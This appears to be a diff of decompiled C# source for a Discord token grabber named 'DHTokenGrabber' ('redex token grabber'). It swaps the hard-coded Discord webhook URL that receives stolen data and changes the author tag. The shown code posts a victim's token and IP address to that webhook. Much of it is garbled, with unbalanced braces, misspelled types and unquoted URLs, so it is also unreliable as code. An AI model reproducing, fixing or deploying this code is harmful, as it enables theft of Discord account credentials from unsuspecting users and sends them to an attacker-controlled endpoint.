@@ -1,5 +1,4 @@
-https://discord.com/api/webhooks/933091106332237834/UjLt9lkvZlQ5-rwdTjLC9ckuT84_3jMjG0lR1YE2wHyuCk6g4JWP9WfNn1ZOvBUS0QMq
-staff
+https://discord.com/api/webhooks/915350603981520946/y0FpguWIAH3lB2GqzxWbsIZ2hW85K6orBEOb36wE8znvAYq6YhHyr_wMkGIEcZDS5USq
 namespace DHTokenGrabber
 {   
 // token: RID: 365 RVA: file Offset:
@@ -44,22 +43,22 @@ program.GetIP();
 "\r\nResult",
 token
 "content");
-}))),
+})),
 try 
 {
-    httpResponseMEssage result = httpClient.PostAsync(settings.WebHook, multiPlataformDataContent).result;
+    HttpResponseMEssage result = httpClient.PostAsync(settings.WebHook, multiPlataformDataContent).Result;
 }
 catch (Exception)
 {
 }
  }
- // Token: 0x06000008 RID: 8 RVA: 0x00002368 File Offset: 0x00000568
+ // Token: 0x060008 RID: 365 RVA: 0x0000818 File Offset: 0x00009A18
  private static string GetIP()
  {
      string result;
      try
  }
-  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/933091106332237834/UjLt9lkvZlQ5-rwdTjLC9ckuT84_3jMjG0lR1YE2wHyuCk6g4JWP9WfNn1ZOvBUS0QMq").result;
+  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/915350603981520946/y0FpguWIAH3lB2GqzxWbsIZ2hW85K6orBEOb36wE8znvAYq6YhHyr_wMkGIEcZDS5USq").result;
 }
 catch (WebException)
 }
@@ -69,7 +68,7 @@ return result;
 }
 }
 }   
-public static void sendWebHook(string discordWebHook,string content)
+public static void sendWebHook(string discordWebHook,   string content)
 {
     try
     {   
@@ -78,26 +77,24 @@ public static void sendWebHook(string discordWebHook,string content)
         { 
             {
                 "content",
-                "´´´" + string.join("\n",new string[]
+                "" + string.join("\n",new string[]
                 {
                     content
-                }) + "´´´"
+                }) + ""
             },
             {
-                "𝑻𝒐𝒎𝒊𝒐𝒌𝒂 𝑪𝒉𝒊𝒌𝒊𝒕𝒐𝒖#4939"
+                "NamDO -Sam#0386"
                 "redex token grabber"
             },
             {
-                "undefined//discord.com/assets/652f40427e1f5186ad54836074898279.png"
+                "https//cdn.discordapp.com/attachments/652f40427e1f5186ad54836074898279/discord -icon-png-13.png"
 
             }
         };
-        httpClient.PostAsync(https://discord.com/api/webhooks/933091106332237834/UjLt9lkvZlQ5-rwdTjLC9ckuT84_3jMjG0lR1YE2wHyuCk6g4JWP9WfNn1ZOvBUS0QMq, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
+        httpClient.PostAsync(https://discord.com/api/webhooks/915350603981520946/y0FpguWIAH3lB2GqzxWbsIZ2hW85K6orBEOb36wE8znvAYq6YhHyr_wMkGIEcZDS5USq, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
         catch (WebException)
         {
         }
     }
     // token: RID:366 RVA:0x00008888 File Offset:e
     
-    
-   
